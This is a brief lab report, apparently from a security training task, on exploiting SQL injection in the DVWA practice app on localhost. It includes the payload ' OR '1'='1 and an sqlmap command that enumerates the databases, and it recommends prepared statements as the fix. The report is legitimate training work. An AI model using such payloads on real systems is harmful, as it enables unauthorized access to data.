Task 9 - Exploit a Vulnerability in a Web Application (SQL Injection)

Objective -
Identify and exploit an SQL Injection vulnerability in DVWA and suggest mitigation techniques.

Tools Used -
- DVWA (Damn Vulnerable Web Application)
- XAMPP/WAMP for local server
- SQLMap (for automated exploitation)

Steps Performed -

Setup -
DVWA installed on localhost using XAMPP. Security level set to Low.

SQL Injection -
In the user ID input field of DVWA SQLi page, entered:

' OR '1'='1

Result: Extracted all user details from the database.

Automation with SQLMap
Command used:
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xyz; security=low" --dbs

Result: Discovered databases on server.

Screenshots -
- dvwa_login.png: DVWA login page
- dvwa_security_low.png: Security level set to Low
- sql_injection_result.png: SQL Injection successfully extracted data

Mitigation -
Use prepared statements (parameterized queries) or ORM to avoid SQL injection.

Conclusion -
Successfully exploited an SQLi vulnerability and demonstrated the importance of secure coding practices.
